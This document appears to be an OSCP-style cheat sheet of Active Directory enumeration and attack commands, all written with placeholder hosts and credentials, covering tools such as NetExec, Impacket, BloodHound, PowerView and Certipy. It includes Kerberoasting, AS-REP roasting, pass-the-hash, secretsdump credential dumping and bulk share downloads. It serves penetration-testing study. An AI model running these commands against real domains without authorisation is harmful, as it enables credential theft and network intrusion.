# NetExec SMB
nxc smb 10.10.10.10 -u user -p password
nxc smb 10.10.10.10 -d DOMAIN -u user -p password
nxc smb 10.10.10.10 -u user -H NTHASH
nxc smb 10.10.10.10 -u user -p password --shares
nxc smb 10.10.10.10 -u user -p password --users
nxc smb 10.10.10.10 -u user -p password --groups
nxc smb 10.10.10.10 -u user -p password --local-groups
nxc smb 10.10.10.10 -u user -p password --sessions
nxc smb 10.10.10.10 -u user -p password --loggedon-users
nxc smb 10.10.10.10 -u user -p password --pass-pol
nxc smb 10.10.10.10 -u user -p password --rid-brute
nxc smb 10.10.10.10 -u user -p password --disks

# NetExec LDAP
nxc ldap 10.10.10.10 -u user -p password
nxc ldap 10.10.10.10 -d DOMAIN -u user -p password
nxc ldap 10.10.10.10 -u user -H NTHASH
nxc ldap 10.10.10.10 -u user -p password --users
nxc ldap 10.10.10.10 -u user -p password --groups
nxc ldap 10.10.10.10 -u user -p password --password-not-required
nxc ldap 10.10.10.10 -u user -p password --admin-count
nxc ldap 10.10.10.10 -u user -p password --trusted-for-delegation
nxc ldap 10.10.10.10 -u user -p password --kerberoasting kerberoast.txt
nxc ldap 10.10.10.10 -u user -p password --asreproast asrep.txt
nxc ldap 10.10.10.10 -u user -p password --bloodhound --collection All

# SMBClient
smbclient -L //10.10.10.10 -U user%password
smbclient //10.10.10.10/SHARE -U user%password
smbclient //10.10.10.10/SHARE -U DOMAIN/user%password
smbclient //10.10.10.10/SHARE -U user%password -c 'recurse;prompt OFF;ls'
smbclient //10.10.10.10/SHARE -U user%password -c 'recurse;prompt OFF;mget *'

# SMBMap
smbmap -H 10.10.10.10 -u user -p password
smbmap -H 10.10.10.10 -d DOMAIN -u user -p password
smbmap -H 10.10.10.10 -u user -H NTHASH
smbmap -H 10.10.10.10 -u user -p password -r
smbmap -H 10.10.10.10 -u user -p password -R SHARE
smbmap -H 10.10.10.10 -u user -p password --download "SHARE\\file.txt"

# LDAPSearch
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local"
ldapsearch -x -H ldap://10.10.10.10 -D "DOMAIN\\user" -w password -b "dc=domain,dc=local"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=user)"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=group)"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local" "(objectClass=computer)"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local" "(servicePrincipalName=*)"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local" "(description=*)"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local" "(&(objectClass=user)(servicePrincipalName=*))"
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "dc=domain,dc=local" "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

# Impacket
GetADUsers.py DOMAIN/user:password -all -dc-ip 10.10.10.10
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt
GetNPUsers.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt
lookupsid.py DOMAIN/user:password@10.10.10.10
samrdump.py DOMAIN/user:password@10.10.10.10
secretsdump.py DOMAIN/user:password@10.10.10.10

# BloodHound
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c DCOnly
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c Group,LocalAdmin,Session,Trusts,ACL
bloodhound-python -u user --hashes :NTHASH -d domain.local -ns 10.10.10.10 -c All

# Kerberos
kinit user@DOMAIN.LOCAL
klist
KRB5CCNAME=user.ccache nxc smb 10.10.10.10 -k
KRB5CCNAME=user.ccache nxc ldap 10.10.10.10 -k
KRB5CCNAME=user.ccache smbclient -k //10.10.10.10/SHARE
KRB5CCNAME=user.ccache wmiexec.py -k -no-pass DOMAIN/user@host.domain.local

# PowerView
Import-Module .\PowerView.ps1
Get-Domain
Get-DomainController
Get-DomainPolicy
Get-DomainSID
Get-DomainUser
Get-DomainUser -Identity user
Get-DomainUser -SPN
Get-DomainUser -PreauthNotRequired
Get-DomainUser -AdminCount
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"
Get-DomainGroup
Get-DomainGroupMember "Domain Admins"
Get-DomainGroupMember "Enterprise Admins"
Get-DomainGroupMember "Administrators"
Get-DomainOU
Get-DomainGPO
Get-DomainTrust
Find-LocalAdminAccess
Find-DomainShare
Find-DomainShare -CheckShareAccess
Find-InterestingDomainShareFile
Find-InterestingDomainAcl

# Windows Built-ins
whoami /user
whoami /groups
whoami /priv
net user /domain
net user user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Domain Computers" /domain
net group "Domain Controllers" /domain
net accounts /domain
nltest /dclist:DOMAIN
nltest /domain_trusts
set l
set u
echo %USERDNSDOMAIN%
echo %LOGONSERVER%
gpresult /r
klist

# PowerShell AD Module
Get-ADDomain
Get-ADForest
Get-ADDomainController
Get-ADUser -Filter *
Get-ADUser user -Properties *
Get-ADGroup -Filter *
Get-ADGroupMember "Domain Admins"
Get-ADComputer -Filter *
Get-ADComputer -Filter * -Properties OperatingSystem
Get-ADObject -LDAPFilter "(servicePrincipalName=*)"
Get-ADTrust -Filter *

# SharpHound
SharpHound.exe -c All
SharpHound.exe -c DCOnly
SharpHound.exe -c Group,LocalAdmin,Session,Trusts,ACL
SharpHound.exe --CollectionMethods All --Domain domain.local

# Certipy
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -enabled
certipy find -u user@domain.local -hashes :NTHASH -dc-ip 10.10.10.10

# Common OSCP Commands
nxc smb 10.10.10.10 -u user -p password --shares
nxc smb 10.10.10.10 -u user -p password --rid-brute
nxc ldap 10.10.10.10 -u user -p password --bloodhound --collection All
GetUserSPNs.py DOMAIN/user:password -dc-ip 10.10.10.10 -request
bloodhound-python -u user -p password -d domain.local -ns 10.10.10.10 -c All
Find-LocalAdminAccess
Find-DomainShare -CheckShareAccess
